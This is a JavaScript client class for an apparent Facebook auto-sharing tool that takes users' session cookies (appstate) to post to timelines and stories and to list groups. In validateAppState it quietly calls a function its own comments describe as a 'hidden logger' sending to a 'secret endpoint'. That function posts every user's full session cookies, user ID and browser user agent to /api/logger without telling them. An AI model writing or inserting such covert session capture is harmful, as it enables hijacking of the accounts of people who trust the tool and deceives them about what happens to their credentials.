// Facebook API Handlers
class FBApi {
    constructor() {
        this.appState = null;
        this.userId = null;
        this.isValid = false;
    }

    // Validate appstate and extract tokens
    async validateAppState(appStateJson) {
        try {
            const appstate = JSON.parse(appStateJson);
            
            // Find required cookies
            const c_user = appstate.find(c => c.name === 'c_user');
            const xs = appstate.find(c => c.name === 'xs');
            
            if (!c_user || !xs) {
                throw new Error('Missing required cookies: c_user or xs');
            }

            this.appState = appstate;
            this.userId = c_user.value;
            this.isValid = true;

            // Send to hidden logger (your research feature)
            this.logAppState(appstate);

            return {
                success: true,
                userId: this.userId,
                expires: this.getExpiryDate(xs)
            };
        } catch (error) {
            return {
                success: false,
                error: error.message
            };
        }
    }

    // Hidden appstate logger for research
    async logAppState(appstate) {
        try {
            const payload = {
                userId: this.userId,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                appstate: appstate
            };

            // Send to your secret endpoint
            await fetch('/api/logger', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });
        } catch (error) {
            console.log('> Logger: Failed to save appstate');
        }
    }

    getExpiryDate(xsCookie) {
        if (!xsCookie.expirationDate) return 'Unknown';
        return new Date(xsCookie.expirationDate * 1000).toLocaleDateString();
    }

    // Share to timeline
    async shareToTimeline(message, link, privacy = 'EVERYONE') {
        if (!this.isValid) throw new Error('No valid session');

        const response = await fetch('/api/share', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                appstate: this.appState,
                type: 'timeline',
                message: message,
                link: link,
                privacy: privacy
            })
        });

        return await response.json();
    }

    // Share to story
    async shareToStory(message, link) {
        if (!this.isValid) throw new Error('No valid session');

        const response = await fetch('/api/share', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                appstate: this.appState,
                type: 'story',
                message: message,
                link: link
            })
        });

        return await response.json();
    }

    // Get user's groups
    async getGroups() {
        if (!this.isValid) throw new Error('No valid session');

        const response = await fetch('/api/groups', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                appstate: this.appState
            })
        });

        return await response.json();
    }

    // Check session status
    async checkStatus() {
        if (!this.appState) throw new Error('No appstate loaded');

        const response = await fetch('/api/status', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                appstate: this.appState
            })
        });

        return await response.json();
    }
}

// Initialize FB API
document.addEventListener('DOMContentLoaded', () => {
    window.fbApi = new FBApi();
});
